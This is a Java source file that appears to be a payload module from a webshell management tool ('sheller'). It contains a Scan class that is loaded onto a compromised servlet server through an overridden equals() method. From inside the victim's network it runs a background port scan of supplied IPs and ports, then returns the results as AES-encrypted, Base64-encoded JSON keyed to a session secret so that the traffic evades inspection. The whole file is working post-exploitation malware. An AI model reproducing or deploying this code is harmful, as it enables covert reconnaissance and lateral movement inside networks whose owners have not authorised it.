package vip.youwe.sheller.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Scan implements Runnable {

    public static String ipList;
    public static String portList;
    public static String taskID;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    public Scan(HttpSession session) {
        this.Session = session;
    }


    public Scan() {
    }


    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        page.getResponse().setCharacterEncoding("UTF-8");
        Map result = new HashMap<String, String>();

        try {
            (new Thread(new Scan(this.Session))).start();
            result.put("msg", "扫描任务提交成功");
            result.put("status", "success");
        } catch (Exception e) {
            result.put("msg", e.getMessage());
            result.put("status", "fail");
        } finally {

            try {
                ServletOutputStream so = this.Response.getOutputStream();
                so.write(Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so.flush();
                so.close();
                page.getOut().clear();
            } catch (Exception e) {

                e.printStackTrace();
            }
        }
        return true;
    }

    public void run() {
        try {
            String[] ips = ipList.split(",");
            String[] ports = portList.split(",");
            Map<String, String> sessionObj = new HashMap<String, String>();
            Map<String, String> scanResult = new HashMap<String, String>();
            sessionObj.put("running", "true");
            for (String ip : ips) {
                for (String port : ports) {
                    try {
                        Socket socket = new Socket();
                        socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 1000);
                        socket.close();
                        scanResult.put(ip + ":" + port, "open");
                    } catch (Exception ex) {
                        scanResult.put(ip + ":" + port, "closed");
                    }
                    sessionObj.put("result", buildJson(scanResult, false));
                    this.Session.setAttribute(taskID, sessionObj);
                }
            }
            sessionObj.put("running", "false");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }


    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                } else {
                    this.getClass();
                    Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }

    private String buildJsonArray(List<Map<String, String>> entityList, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (Map<String, String> entity : entityList) {
            sb.append(buildJson(entity, encode) + ",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("]");
        return sb.toString();
    }
}
